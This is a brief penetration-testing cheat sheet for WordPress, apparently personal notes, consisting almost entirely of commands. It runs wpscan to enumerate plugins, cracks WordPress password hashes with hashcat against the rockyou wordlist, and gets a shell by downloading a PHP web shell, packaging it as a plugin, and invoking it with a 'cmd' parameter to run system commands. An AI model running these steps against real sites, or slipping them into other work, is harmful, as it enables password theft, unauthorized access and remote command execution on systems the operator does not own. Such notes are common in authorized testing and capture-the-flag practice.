# Wordpress

## wpscan

```
wpscan --url <url> --enumerate ap --api-token <api-token>
```

## hashcat
```
hashcat -m 400 -a 0 -o cracked.txt  hash.txt /usr/share/wordlists/rockyou.txt
```

## Shell via Plugin
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/WordPress/plugin-shell.php
zip plugin-shell.zip plugin-shell.php
http://<url>/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```
